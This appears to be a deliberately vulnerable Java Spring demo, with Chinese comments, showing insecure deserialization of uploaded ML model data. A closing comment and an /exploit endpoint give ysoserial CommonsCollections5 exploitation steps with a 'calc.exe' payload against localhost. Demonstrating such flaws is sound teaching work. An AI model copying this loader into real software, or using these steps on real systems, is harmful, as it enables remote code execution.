import java.io.*;
import java.util.*;
import java.net.*;
import org.springframework.web.bind.annotation.*;
import org.springframework.stereotype.*;

// 模拟机器学习模型类
class MLModel implements Serializable {
    private static final long serialVersionUID = 1L;
    public double[] weights = new double[1000];
    
    public void predict(double[] input) {
        System.out.println("Predicting with weights...");
    }
}

// 不安全的模型加载器
class ModelLoader {
    public static MLModel loadModel(byte[] data) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            // 漏洞点：直接反序列化不可信数据
            return (MLModel) ois.readObject();
        }
    }
}

@RestController
@RequestMapping("/ml")
public class ModelController {
    // 模拟接收外部模型上传的接口
    @PostMapping("/load")
    public String loadModel(@RequestParam("model") String base64Model) {
        try {
            byte[] data = Base64.getDecoder().decode(base64Model);
            MLModel model = ModelLoader.loadModel(data);
            model.predict(new double[]{1.0, 2.0});
            return "Model loaded successfully";
        } catch (Exception e) {
            return "Error loading model: " + e.getMessage();
        }
    }

    // 模拟模型生成端点（用于演示漏洞利用）
    @GetMapping("/generate")
    public String generateModel() {
        try {
            MLModel model = new MLModel();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
                oos.writeObject(model);
            }
            return Base64.getEncoder().encodeToString(bos.toByteArray());
        } catch (Exception e) {
            return "Error generating model";
        }
    }

    // 模拟攻击者利用点
    @GetMapping("/exploit")
    public String exploit() {
        return "访问 /generate 获取合法模型，使用ysoserial修改序列化数据注入恶意代码，再通过 /load 上传触发";
    }
}

/*
 * 漏洞利用示例流程：
 * 1. 获取合法序列化数据：curl http://localhost:8080/ml/generate
 * 2. 使用 ysoserial 修改序列化链：
 *    java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64 > payload.b64
 * 3. 触发漏洞：curl http://localhost:8080/ml/load?model=$(cat payload.b64)
 */